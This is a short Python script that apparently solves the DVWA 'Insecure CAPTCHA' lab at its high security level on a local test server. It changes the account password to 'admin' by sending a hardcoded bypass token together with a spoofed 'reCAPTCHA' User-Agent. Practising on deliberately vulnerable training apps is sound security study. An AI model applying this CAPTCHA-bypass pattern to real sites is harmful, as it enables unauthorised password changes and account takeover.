import requests

url = "http://localhost:8080/vulnerabilities/captcha/"

cookies = {
    "PHPSESSID": "SEU_COOKIE",
    "security": "high"
}

headers = {
    "User-Agent": "reCAPTCHA"
}

data = {
    "password_new": "admin",
    "password_conf": "admin",
    "g-recaptcha-response": "hidd3n_valu3",
    "Change": "Change"
}

r = requests.post(url, headers=headers, cookies=cookies, data=data)

print(r.text)
